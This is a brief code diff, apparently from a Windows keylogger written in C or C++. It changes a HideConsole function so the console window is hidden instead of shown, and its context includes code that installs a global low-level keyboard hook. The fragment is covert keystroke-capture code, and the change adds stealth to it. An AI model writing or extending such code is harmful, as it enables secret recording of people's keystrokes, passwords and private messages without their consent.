@@ -33,7 +33,7 @@ int main() {
 
 
 /// To hide the console
-void HideConsole() { ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_NORMAL); }
+void HideConsole() { ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE); }
 
 /// Create a hook
 void CreateHook() { hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) HookCallback, NULL, 0); }
